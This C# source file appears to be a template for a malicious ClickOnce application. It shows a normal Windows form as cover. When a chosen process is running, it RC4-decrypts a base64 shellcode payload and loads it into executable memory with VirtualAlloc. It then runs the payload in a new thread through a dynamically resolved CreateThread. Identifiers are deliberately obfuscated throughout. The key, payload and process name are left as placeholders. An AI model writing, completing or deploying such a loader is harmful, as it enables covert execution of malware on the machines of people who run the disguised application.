using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.IO;
using System.Text;
using System.Collections.ObjectModel;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace ClickOnceTemplate
{
    static class Program
    {
		private static UInt32 VAR40 = 0x1000;
		private static UInt32 VAR41 = 0x40;
		[DllImport("kernel32")]
		private static extern UInt32 VirtualAlloc(UInt32 VAR21, UInt32 VAR12, UInt32 VAR16, UInt32 VAR8);
		[DllImport("kernel32")]
		private static extern UInt32 WaitForSingleObject(IntPtr VAR4, UInt32 VAR17);
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate IntPtr VAR32(UInt32 VAR7, UInt32 VAR32, IntPtr VAR1, IntPtr VAR8, UInt32 VAR40, ref UInt32 VAR26);
		[DllImport("kernel32.dll")]
		public static extern IntPtr LoadLibrary(string VAR17);
		[DllImport("kernel32.dll")]
		public static extern IntPtr GetProcAddress(IntPtr VAR5, string VAR26);
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            IntPtr VAR7 = VAR8();
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
            if (VAR7 != IntPtr.Zero)
            {
                WaitForSingleObject(VAR7, 0xffffffff);
            }
        }

        static IntPtr VAR8()
        {
            if (Process.GetProcessesByName("[PROCESS_NAME]").Length > 0)
            {				
				byte[] VAR9 = {[KEY]};
				byte[] VAR10 = Convert.FromBase64String("[PAYLOAD]");
				byte[] VAR11 = VAR16.VAR28(VAR9, VAR10);
				IntPtr VAR33 = LoadLibrary("kernel32.dll");
				IntPtr VAR34 = GetProcAddress(VAR33, "CreateThread");
				VAR32 VAR35 = (VAR32)Marshal.GetDelegateForFunctionPointer(VAR34, typeof(VAR32));

				UInt32 VAR42 = VirtualAlloc(0, (UInt32)VAR11.Length, VAR40, VAR41);
				Marshal.Copy(VAR11, 0, (IntPtr)(VAR42), VAR11.Length);
				IntPtr VAR43 = IntPtr.Zero;
				IntPtr VAR44 = IntPtr.Zero;
				UInt32 VAR45 = 0;
				VAR43 = VAR35(0, 0, (IntPtr)VAR42, VAR44, 0, ref VAR45);
                return VAR43;
            }
            return IntPtr.Zero;
        }
    }

	public class VAR16 {
		public static byte[] VAR17(byte[] VAR18, byte[] VAR19) {
			int VAR20, VAR21, VAR22, VAR23, VAR24;
			int[] VAR25, VAR26;
			byte[] VAR27;
			VAR25 = new int[256];
			VAR26 = new int[256];
			VAR27 = new byte[VAR19.Length];
			for (VAR21 = 0; VAR21 < 256; VAR21++) {
				VAR25[VAR21] = VAR18[VAR21 % VAR18.Length];
				VAR26[VAR21] = VAR21;
			}
			for (VAR22 = VAR21 = 0; VAR21 < 256; VAR21++) {
				VAR22 = (VAR22 + VAR26[VAR21] + VAR25[VAR21]) % 256;
				VAR24 = VAR26[VAR21];
				VAR26[VAR21] = VAR26[VAR22];
				VAR26[VAR22] = VAR24;
			}
			for (VAR20 = VAR22 = VAR21 = 0; VAR21 < VAR19.Length; VAR21++) {
				VAR20++;
				VAR20 %= 256;
				VAR22 += VAR26[VAR20];
				VAR22 %= 256;
				VAR24 = VAR26[VAR20];
				VAR26[VAR20] = VAR26[VAR22];
				VAR26[VAR22] = VAR24;
				VAR23 = VAR26[((VAR26[VAR20] + VAR26[VAR22]) % 256)];
				VAR27[VAR21] = (byte)(VAR19[VAR21] ^ VAR23);
			}
			return VAR27;
		}
		public static byte[] VAR28(byte[] VAR29, byte[] VAR30) {
			return VAR17(VAR29, VAR30);
		}
	}
}
